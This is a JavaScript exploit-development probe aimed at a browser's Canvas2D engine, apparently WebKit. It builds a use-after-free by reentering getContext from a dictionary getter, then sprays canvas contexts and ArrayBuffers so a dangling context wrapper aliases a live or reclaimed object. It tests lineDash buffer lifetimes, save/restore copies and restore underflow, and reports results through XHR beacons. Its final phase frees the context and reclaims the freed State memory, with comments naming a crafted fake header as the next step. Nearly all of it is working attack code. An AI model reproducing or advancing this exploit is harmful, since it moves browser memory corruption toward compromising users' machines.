// p492 — Canvas2D aliased pair: lineDash Vector<double> lifetime probe
//
// TARGET MODEL (from p481/p485/p490, source-verified layout):
//   CanvasRenderingContext2D::State contains `Vector<double> lineDash`
//   WTF::Vector = { m_buffer, m_size, m_capacity } (24 bytes, default inline
//   capacity 0 → every non-empty dash array is a heap allocation).
//   setLineDash(v)  -> realizeSaves(); state().lineDash = v;
//   getLineDash()   -> state().lineDash  (copied into a fresh JS Array)
//   save()          -> ++m_unrealizedSaveCount (NO State copy yet)
//   realizeSaves()  -> m_stateStack.append(state())  for each pending save
//                      (this is where the State — and its lineDash Vector —
//                       is actually copied; candidate append() self-ref UAF)
//   restore()       -> pop the last State (the Vector in the popped State is
//                      destroyed, i.e. its m_buffer is freed if heap-backed)
//
// ALIASED PAIR (proven in p481/p485/p490):
//   tc.getContext('2d', {desynchronized: <getter that calls getContext>})
//   1. outer getContext enters, m_context == null
//   2. dictionary conversion fires the getter -> inner getContext creates C1
//   3. outer resumes -> createContext2d() creates C2, unique_ptr frees C1
//   4. dCtx1 (the inner wrapper) is a raw pointer to freed C1
//   5. spraying N contexts reuses C1's 768-byte FastMalloc slot
//   => dCtx1 and sprayX[idx] now address the SAME live C++ object
//
// WHAT THIS PROBE TESTS
//   A. Live-object control. Set 1000 doubles via the spray side, read via the
//      dangling side. Then clear (free/retain the 8KB buffer), spray 8000-byte
//      ArrayBuffers, read again.
//      Expected: identical values, then EMPTY — a live State's m_buffer is
//      replaced on assignment, so there is no stale pointer to read through.
//      If the second read returns 1000 old doubles, that is the bug we want.
//   B. save()/restore() deep-copy semantics. Does a saved State keep its own
//      lineDash buffer (so clearing the live one and restoring brings the old
//      values back), or does it alias? Two-level save/restore and a 64-save
//      realize stress (realizeSavesLoop appends while reading state()).
//   C. Reentrancy during IDL sequence conversion (array-like getters, Proxy
//      get trap, iterator protocol), odd/non-finite/huge dash values,
//      returned-array independence.
//   F. restore() underflow, run AFTER D because a missing size guard in
//      restore() can corrupt the state stack.
//   E. Capacity-boundary sweep: N unrealized saves then one realize, for the
//      Vector<State> growth points (1,2,3,4,7,8,9,15,16,17,31,32,33), with a
//      2400-byte dash buffer live during every copy.
//   D. LAST (crash-risk): free the aliased context entirely, spray zero-filled
//      ABs across the State / state-stack size classes (128..1024, skipping
//      the 768-byte context class), then read lineWidth/getTransform/
//      getLineDash through the dangling wrapper. A zeroed fake State
//      (lineWidth==0, globalAlpha==0, transform all 0) proves we control the
//      reclaimed State and that a crafted Vector header is the next step.
//
// All beacons: sync XHR POST to BASE/beacon/V492-<TAG>, body "[<ms>] ...".
// No deployment files touched; this is a probe-only artifact.
//
// Beacon prefix: V492-

(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();

  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V492-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch (e) {}
  }

  // join a[start .. start+n-1] with commas (keeps beacon bodies short)
  function jn(a, start, n) {
    if (!a) return 'null';
    var s = '';
    var end = Math.min(a.length, start + n);
    for (var i = start; i < end; i++) s += (i > start ? ',' : '') + a[i];
    return s;
  }

  // mismatch count between two arrays (capped at the shorter length)
  function mm(a, b) {
    if (!a || !b) return -1;
    var n = Math.min(a.length, b.length);
    var c = 0;
    for (var i = 0; i < n; i++) if (a[i] !== b[i]) c++;
    return c;
  }

  function mk(n, f) {
    var a = new Array(n);
    for (var i = 0; i < n; i++) a[i] = f(i);
    return a;
  }

  // GC pressure: small objects + ArrayBuffers, dropped on return
  function junkRound(n) {
    var a = [];
    for (var i = 0; i < n; i++) a.push({ a: new ArrayBuffer(64), b: [i] });
    return a;
  }

  B('BOOT', navigator.userAgent);

  var protoOk = false, sdType = '?', gdType = '?';
  try {
    protoOk = (typeof CanvasRenderingContext2D !== 'undefined' && !!CanvasRenderingContext2D.prototype);
    if (protoOk) {
      sdType = typeof CanvasRenderingContext2D.prototype.setLineDash;
      gdType = typeof CanvasRenderingContext2D.prototype.getLineDash;
    }
  } catch (e) {}
  B('FEATURES', 'setLineDash=' + sdType + ',getLineDash=' + gdType + ',proxy=' + (typeof Proxy) + ',symbolIter=' + (typeof Symbol !== 'undefined' && !!Symbol.iterator));

  // ═══════════════════════════════════════════════════════════
  // PHASE 1: Build the aliased pair (dangling wrapper + live spray ctx)
  // ═══════════════════════════════════════════════════════════
  var tc1 = document.createElement('canvas');
  tc1.width = 10;
  tc1.height = 10;
  document.body.appendChild(tc1);

  var dCtx1 = null, lCtx1 = null, cc1 = 0, s1 = {};
  Object.defineProperty(s1, 'desynchronized', {
    get: function() {
      cc1++;
      if (cc1 === 1) {
        try { dCtx1 = tc1.getContext('2d'); } catch (e) {}
      }
      return false;
    }
  });
  try { lCtx1 = tc1.getContext('2d', s1); } catch (e) { B('ALIAS-THROW', e.message); }

  if (!dCtx1 || !lCtx1) {
    B('ABORT', 'no-pair d=' + !!dCtx1 + ',l=' + !!lCtx1);
    B('DONE', 'abort-pair');
    return;
  }
  B('ALIAS-PAIR', 'distinct=' + (dCtx1 !== lCtx1) + ',calls=' + cc1);

  var NC = 200;
  var sprayC = [], sprayX = [];
  for (var i = 0; i < NC; i++) {
    var c = document.createElement('canvas');
    c.width = 10;
    c.height = 10;
    var x = c.getContext('2d');
    x.lineWidth = 500 + i;
    sprayC.push(c);
    sprayX.push(x);
  }

  var lwProbe = -1;
  try { lwProbe = dCtx1.lineWidth; } catch (e) { B('ALIAS-READ-ERR', e.message); }
  var idx1 = -1;
  if (typeof lwProbe === 'number' && lwProbe >= 500 && lwProbe < 500 + NC) {
    idx1 = Math.round(lwProbe - 500);
  }
  if (idx1 < 0) {
    B('ALIAS-MISS', 'lw=' + lwProbe);
    B('DONE', 'alias-miss');
    return;
  }
  B('ALIAS-HIT', 'idx=' + idx1 + ',lw=' + lwProbe);

  var spray = sprayX[idx1];

  // Bidirectional confirmation: write via spray side, read via dangling side
  var bdOk = false, bdRead = -1;
  try {
    spray.lineWidth = 777.25;
    bdRead = dCtx1.lineWidth;
    bdOk = (bdRead === 777.25);
    spray.lineWidth = 500 + idx1;
  } catch (e) { B('ALIAS-BIDIR-ERR', e.message); }
  B('ALIAS-BIDIR', 'wrote=777.25,read=' + bdRead + ',ok=' + bdOk);

  // ═══════════════════════════════════════════════════════════
  // PHASE A: live-object lineDash control (user phases 1–5)
  // ═══════════════════════════════════════════════════════════

  var N1 = 1000;
  var dashA = mk(N1, function(k) { return k + 0.5; }); // exact doubles

  B('A1-PRE', 'setLineDash n=' + N1 + ' (expect 8000B heap buffer)');
  var a1err = '';
  var t1 = Date.now();
  try { spray.setLineDash(dashA); } catch (e) { a1err = e.message; }
  B('A1-SET', 'err=' + (a1err || 'none') + ',opMs=' + (Date.now() - t1));

  var a2 = null, a2err = '', a2Mm = -1;
  try { a2 = dCtx1.getLineDash(); } catch (e) { a2err = e.message; }
  if (a2) {
    a2Mm = mm(a2, dashA);
    B('A2-DANGLING', 'len=' + a2.length + ',first=' + jn(a2, 0, 4) + ',last=' + jn(a2, Math.max(0, a2.length - 2), 2));
    B('A2-MATCH', 'mismatch=' + a2Mm + ',lenOk=' + (a2.length === N1));
  } else {
    B('A2-ERR', a2err || 'null');
  }

  // Returned array must be a fresh copy (mutating it must not hit the State)
  if (a2 && a2.length) {
    var a2first = a2[0];
    a2[0] = -12345.5;
    var a3 = null;
    try { a3 = dCtx1.getLineDash(); } catch (e) {}
    B('A3-COPY', 'separate=' + (a3 && a3[0] === a2first) + ',stateV0=' + (a3 ? a3[0] : '-'));
  }

  // User phase 3: clear through the spray side (same C++ object).
  // NOTE: this also clears the dangling side because they are the SAME object.
  B('A4-PRE-CLEAR');
  var a4err = '';
  try { spray.setLineDash([]); } catch (e) { a4err = e.message; }
  var a4 = null;
  try { a4 = dCtx1.getLineDash(); } catch (e) { B('A4-READ-ERR', e.message); }
  B('A4-CLEARED', 'len=' + (a4 ? a4.length : '-') + ',err=' + (a4err || 'none') + ',stale=' + (a4 && a4.length === N1 ? 'YES' : 'NO'));

  // User phase 4: spray 8000-byte zeroed ABs (1000 doubles), the same size
  // class as the freed/cleared Vector buffer.
  var AB8K = 8000, N8K = 200;
  var ab8 = [];
  for (var k = 0; k < N8K; k++) ab8.push(new ArrayBuffer(AB8K));
  B('A5-SPRAY', 'n=' + N8K + ',size=' + AB8K + ' (zero-filled)');

  var a5 = null, a5err = '';
  try { a5 = dCtx1.getLineDash(); } catch (e) { a5err = e.message; }
  if (a5) {
    B('A5-READ', 'len=' + a5.length + ',vals=' + jn(a5, 0, 4) + ',err=' + (a5err || 'none'));
    if (a5.length !== 0) {
      B('A5-VERDICT', 'len=' + a5.length + ' (nonzero!) mismatchVsA=' + mm(a5, dashA));
    } else {
      B('A5-VERDICT', 'EMPTY as expected for a live State - no stale m_buffer');
    }
  } else {
    B('A5-ERR', a5err || 'null');
  }

  // Re-fill after the AB spray: still coherent? (allocator sanity)
  var a6 = null;
  try {
    spray.setLineDash(dashA);
    a6 = dCtx1.getLineDash();
  } catch (e) { B('A6-ERR', e.message); }
  if (a6) B('A6-REFILL', 'len=' + a6.length + ',mismatch=' + mm(a6, dashA));

  // ═══════════════════════════════════════════════════════════
  // PHASE B: save()/restore() copy semantics
  //   save() only bumps m_unrealizedSaveCount; the State copy happens at the
  //   next state-mutating call (realizeSaves). WTF::Vector copy ctor is deep,
  //   so a realized save should own a private 8000-byte dash buffer.
  // ═══════════════════════════════════════════════════════════
  var N2 = 1000;
  var dashB = mk(N2, function(k) { return 100 + k * 0.25; });

  var bErr = '';
  try {
    spray.setLineDash(dashB);
    spray.save();
    B('B1-SAVED', 'unrealized=1,dashLen=' + dCtx1.getLineDash().length);
    spray.lineWidth = 2.5; // forces realizeSavesLoop -> State copy
    B('B2-REALIZED', 'lw=' + spray.lineWidth + ',dashLen=' + dCtx1.getLineDash().length);
  } catch (e) { bErr = e.message; B('B-ERR1', bErr); }

  var b3 = null;
  try { b3 = dCtx1.getLineDash(); } catch (e) {}
  B('B3-CURRENT', 'len=' + (b3 ? b3.length : '-') + ',mismatch=' + mm(b3, dashB));

  try {
    spray.setLineDash([]); // free/drop the live copy's buffer
    B('B4-CLEARED', 'len=' + dCtx1.getLineDash().length);
    spray.restore(); // pop back to the realized State (private copy)
  } catch (e) { B('B-ERR2', e.message); }

  var b5 = null;
  try { b5 = dCtx1.getLineDash(); } catch (e) {}
  B('B5-RESTORED', 'len=' + (b5 ? b5.length : '-') + ',mismatch=' + mm(b5, dashB) + ',lw=' + dCtx1.lineWidth);

  // Two-level save: base(1000) -> top(empty) -> clear -> save -> realize -> restore x2
  var bErr2 = '';
  try {
    spray.save();
    spray.lineWidth = 3.5;      // realize: copy (dashB)
    spray.setLineDash([]);      // top loses its buffer
    spray.save();
    spray.lineWidth = 4.5;      // realize: copy (empty)
    spray.setLineDash(mk(200, function(k) { return 300 + k; })); // top = 200
    spray.restore();            // -> empty state
    spray.restore();            // -> dashB state
  } catch (e) { bErr2 = e.message; }

  var b6 = null;
  try { b6 = dCtx1.getLineDash(); } catch (e) {}
  B('B6-TWO-LEVEL', 'len=' + (b6 ? b6.length : '-') + ',mismatch=' + mm(b6, dashB) + ',lw=' + dCtx1.lineWidth + ',err=' + (bErr2 || 'none'));

  // 64 unrealized saves + one realize: 64 State copies, each allocating an
  // 8000-byte dash buffer while the state stack reallocates underneath.
  var b7 = null, b8 = null, b7err = '';
  try {
    spray.setLineDash(dashB);
    for (var s = 0; s < 64; s++) spray.save();
    B('B7-PRE-REALIZE', 'saves=64,dashLen=' + dCtx1.getLineDash().length);
    var t7 = Date.now();
    spray.lineWidth = 5.5;
    B('B7-REALIZED', 'opMs=' + (Date.now() - t7) + ',lw=' + spray.lineWidth);
    b7 = dCtx1.getLineDash();
    B('B7-DASH', 'len=' + b7.length + ',mismatch=' + mm(b7, dashB) + ',lwDangling=' + dCtx1.lineWidth);
    for (var s = 0; s < 64; s++) spray.restore();
    b8 = dCtx1.getLineDash();
    B('B7-RESTORED', 'len=' + b8.length + ',mismatch=' + mm(b8, dashB) + ',lw=' + dCtx1.lineWidth);
  } catch (e) { b7err = e.message; B('B7-ERR', b7err); }

  // ═══════════════════════════════════════════════════════════
  // PHASE C: conversion reentrancy + value edge cases
  // ═══════════════════════════════════════════════════════════

  // C1: array-like object with indexed getters (sequence conversion)
  var hitC1 = 0;
  var evil = { length: 6 };
  for (var i = 0; i < 6; i++) {
    Object.defineProperty(evil, '' + i, {
      get: function() { hitC1++; return 3.5; },
      configurable: true
    });
  }
  var c1err = '';
  try { spray.setLineDash(evil); } catch (e) { c1err = e.message; }
  var c1 = null;
  try { c1 = dCtx1.getLineDash(); } catch (e) {}
  B('C1-GETTERS', 'hits=' + hitC1 + ',len=' + (c1 ? c1.length : '-') + ',vals=' + jn(c1, 0, 6) + ',err=' + (c1err || 'none'));

  // C1b: explicit iterator protocol
  var itHits = 0, itErr = '';
  try {
    var itObj = {};
    itObj[Symbol.iterator] = function() {
      var k = 0;
      return {
        next: function() {
          itHits++;
          if (k < 4) { k++; return { value: 7.5, done: false }; }
          return { value: undefined, done: true };
        }
      };
    };
    spray.setLineDash(itObj);
  } catch (e) { itErr = e.message; }
  var c1b = null;
  try { c1b = dCtx1.getLineDash(); } catch (e) {}
  B('C1B-ITER', 'nextCalls=' + itHits + ',len=' + (c1b ? c1b.length : '-') + ',err=' + (itErr || 'none'));

  // C2: reenter save()/lineWidth/restore() from inside a conversion getter
  var hitC2 = 0, reErr = '';
  var re = { length: 5 };
  for (var i = 0; i < 5; i++) {
    (function(k) {
      Object.defineProperty(re, '' + k, {
        get: function() {
          hitC2++;
          if (k === 2) {
            try {
              spray.save();
              spray.lineWidth = 6.5; // realize inside conversion
              spray.restore();
            } catch (e) { reErr = e.message; }
          }
          return 10 + k;
        },
        configurable: true
      });
    })(i);
  }
  try { spray.setLineDash(re); } catch (e) { reErr = e.message; }
  var c2 = null;
  try { c2 = dCtx1.getLineDash(); } catch (e) {}
  B('C2-REENTER', 'hits=' + hitC2 + ',len=' + (c2 ? c2.length : '-') + ',vals=' + jn(c2, 0, 5) + ',err=' + (reErr || 'none'));

  // C3: Proxy get trap that saves mid-conversion
  var pc = 0, pErr = '', pSaved = false;
  try {
    var parr = [1.5, 2.5, 3.5, 4.5];
    var prox = new Proxy(parr, {
      get: function(t, key) {
        pc++;
        if (key === '2') {
          try { spray.save(); pSaved = true; } catch (e) { pErr = e.message; }
        }
        return t[key];
      }
    });
    spray.setLineDash(prox);
  } catch (e) { pErr = e.message; }
  var c3 = null;
  try { c3 = dCtx1.getLineDash(); } catch (e) {}
  B('C3-PROXY', 'gets=' + pc + ',saved=' + pSaved + ',len=' + (c3 ? c3.length : '-') + ',vals=' + jn(c3, 0, 4) + ',err=' + (pErr || 'none'));

  // Balance the save() the Proxy trap may have added (only if it fired)
  if (pSaved) { try { spray.restore(); } catch (e) {} }

  // C5: non-finite / negative / odd / huge values (no stroking with Inf)
  var weirdLabels = ['NaN', 'Inf', '-Inf', 'neg', 'zero-zero', 'odd3', 'odd999', 'big', 'denormal'];
  var weirdVals = [
    [NaN, 2],
    [Infinity],
    [-Infinity],
    [-1, 2],
    [0, 0],
    [1, 2, 3],
    mk(999, function(k) { return k + 1; }),
    [1e308, 1e308],
    [5e-324]
  ];
  var wparts = [];
  for (var wi = 0; wi < weirdVals.length; wi++) {
    var werr = '', got = null;
    try { spray.setLineDash(weirdVals[wi]); } catch (e) { werr = e.message; }
    try { got = dCtx1.getLineDash(); } catch (e) { werr = werr || e.message; }
    wparts.push(weirdLabels[wi] + ':len=' + (got ? got.length : '-') +
      ',v0=' + (got && got.length ? got[0] : '-') +
      ',v1=' + (got && got.length > 1 ? got[1] : '-') +
      (werr ? ',err=' + werr : ''));
  }
  B('C5-WEIRD', wparts.join(' | '));

  // C6: getLineDash returns a fresh array every call
  var c6ok = false, c6len = -1;
  try {
    spray.setLineDash([1, 2]);
    var q1 = spray.getLineDash();
    var q2 = spray.getLineDash();
    q1[0] = 99;
    var q3 = spray.getLineDash();
    c6ok = (q1 !== q2) && (q3[0] === 1);
    c6len = q3.length;
  } catch (e) { B('C6-ERR', e.message); }
  B('C6-COPY', 'distinct+fresh=' + c6ok + ',len=' + c6len);

  // C7: draw with a large but finite dash (no Infinity -> no hang risk)
  try {
    spray.setLineDash([1000, 500]);
    spray.beginPath();
    spray.moveTo(0, 0);
    spray.lineTo(9, 9);
    spray.stroke();
    B('C7-STROKE', 'ok,dashLen=' + spray.getLineDash().length);
  } catch (e) { B('C7-STROKE-ERR', e.message); }

  // ═══════════════════════════════════════════════════════════
  // PHASE E: Vector<State> capacity boundaries during realizeSaves
  //   N unrealized saves, then one mutating call -> N appends while the
  //   state stack grows at 1,2,4,8,16,32...  A 2400-byte dash buffer is
  //   live in every copied State, so any append(state()) self-reference
  //   bug has a heap allocation to trip over.
  // ═══════════════════════════════════════════════════════════
  var dashE = mk(300, function(k) { return 200 + k * 0.5; });
  var savePts = [1, 2, 3, 4, 7, 8, 9, 15, 16, 17, 31, 32, 33];
  for (var pi = 0; pi < savePts.length; pi++) {
    var nSave = savePts[pi];
    var eNow = null, eBack = null, eErr = '';
    try {
      spray.setLineDash(dashE);
      for (var s = 0; s < nSave; s++) spray.save();
      spray.lineWidth = 7.5;
      eNow = dCtx1.getLineDash();
      for (var s = 0; s < nSave; s++) spray.restore();
      eBack = dCtx1.getLineDash();
    } catch (e) { eErr = e.message; }
    B('E-' + nSave, 'realizedLen=' + (eNow ? eNow.length : '-') +
      ',mm=' + mm(eNow, dashE) +
      ',backLen=' + (eBack ? eBack.length : '-') +
      ',mmBack=' + mm(eBack, dashE) +
      ',err=' + (eErr || 'none'));
  }

  // ═══════════════════════════════════════════════════════════
  // PHASE D — LAST, crash risk: free the aliased context, then reclaim the
  // State / state-stack chunks with zero-filled ArrayBuffers and read through
  // the dangling wrapper. Zeroed fake State => lineWidth 0, globalAlpha 0,
  // transform all zeros, getLineDash empty (size 0 -> no deref).
  //
  // No beacons between the free and the reads (see p485: XHR allocations can
  // land in the freed slot). Sizes skip 768 (the context object class) so we
  // reclaim the State buffer, not the context header.
  // ═══════════════════════════════════════════════════════════

  // Leave a known large dash in the freed State for reference
  try { spray.setLineDash(mk(1000, function(k) { return 40 + k; })); } catch (e) {}

  B('D-PRE', 'freeing aliased ctx idx=' + idx1);

  var freeC = sprayC[idx1];
  sprayC[idx1] = null;
  sprayX[idx1] = null;
  spray = null;
  try {
    if (freeC && freeC.parentNode) freeC.parentNode.removeChild(freeC);
  } catch (e) {}
  freeC = null;

  // GC pressure so the detached canvas + context are collected
  var jr = null;
  for (var r = 0; r < 5; r++) { jr = junkRound(1500); jr = null; }
  jr = null;

  // Spray zero-filled ABs across candidate State / state-stack sizes.
  var dSizes = [];
  for (var sz = 128; sz <= 736; sz += 16) dSizes.push(sz);
  dSizes.push(784, 800, 832, 864, 896, 928, 960, 992, 1024);
  var PER = 24;
  var dAB = [];
  for (var di = 0; di < dSizes.length; di++) {
    for (var da = 0; da < PER; da++) dAB.push(new ArrayBuffer(dSizes[di]));
  }

  // ─── NO-ALLOCATION-ISH ZONE: read immediately ───────────────
  var dLw = -999, dLwErr = '';
  try { dLw = dCtx1.lineWidth; } catch (e) { dLwErr = e.message; }

  var dGa = -999, dMt = -999, dLdo = -999, dSb = -999;
  try { dGa = dCtx1.globalAlpha; } catch (e) {}
  try { dMt = dCtx1.miterLimit; } catch (e) {}
  try { dLdo = dCtx1.lineDashOffset; } catch (e) {}
  try { dSb = dCtx1.shadowBlur; } catch (e) {}

  var dDash = null, dDashErr = '';
  try { dDash = dCtx1.getLineDash(); } catch (e) { dDashErr = e.message; }

  var dTx = null;
  try { dTx = dCtx1.getTransform(); } catch (e) {}
  // ─── END ZONE ───────────────────────────────────────────────

  B('D-LW', 'lw=' + dLw + ',err=' + (dLwErr || 'none'));
  B('D-PROPS', 'ga=' + dGa + ',miterLimit=' + dMt + ',dashOffset=' + dLdo + ',shadowBlur=' + dSb);
  if (dTx) {
    B('D-TRANSFORM', 'a=' + dTx.a + ',b=' + dTx.b + ',c=' + dTx.c + ',d=' + dTx.d + ',e=' + dTx.e + ',f=' + dTx.f);
  } else {
    B('D-TRANSFORM', 'null');
  }
  if (dDash) {
    B('D-DASH', 'len=' + dDash.length + ',vals=' + jn(dDash, 0, 4) + ',err=' + (dDashErr || 'none'));
  } else {
    B('D-DASH', 'null,err=' + (dDashErr || 'none'));
  }

  var fakeZero = (dLw === 0) && (dGa === 0) && (dMt === 0) && (dLdo === 0);
  var fakeTx = false;
  if (dTx) {
    fakeTx = (dTx.a === 0 && dTx.d === 0 && dTx.e === 0 && dTx.f === 0);
  }
  B('D-VERDICT', 'fakeZeroState=' + fakeZero + ',fakeZeroTransform=' + fakeTx +
    ',dashLen=' + (dDash ? dDash.length : '-') +
    ' (lineWidth default would be 1, globalAlpha 1, miterLimit 10)');

  // ═══════════════════════════════════════════════════════════
  // PHASE F — LAST: restore() underflow (runs after D so a missing size
  // guard in restore() cannot cost us the Phase D results).
  // ═══════════════════════════════════════════════════════════
  var fErr = '';
  try {
    var fc = document.createElement('canvas');
    fc.width = 4;
    fc.height = 4;
    var fx = fc.getContext('2d');
    fx.lineWidth = 9.5;
    fx.setLineDash([1, 2]);
    for (var fi = 0; fi < 5; fi++) fx.restore();
    B('F-UNDERFLOW', 'lw=' + fx.lineWidth + ',dashLen=' + fx.getLineDash().length + ',err=' + (fErr || 'none'));

    fx.save();
    fx.save();
    fx.lineWidth = 1.5;
    for (var fi = 0; fi < 6; fi++) fx.restore();
    B('F-MIXED', 'lw=' + fx.lineWidth + ',dashLen=' + fx.getLineDash().length + ',err=' + (fErr || 'none'));
  } catch (e) { fErr = e.message; B('F-ERR', fErr); }

  B('SUMMARY', 'idx=' + idx1 +
    ',A_len1000_mm=' + a2Mm +
    ',A_afterSpray_len=' + (a5 ? a5.length : '-') +
    ',B_restore_len=' + (b5 ? b5.length : '-') +
    ',B_restore_mm=' + mm(b5, dashB) +
    ',D_lw=' + dLw);
  B('DONE', 'p492-complete');
})();
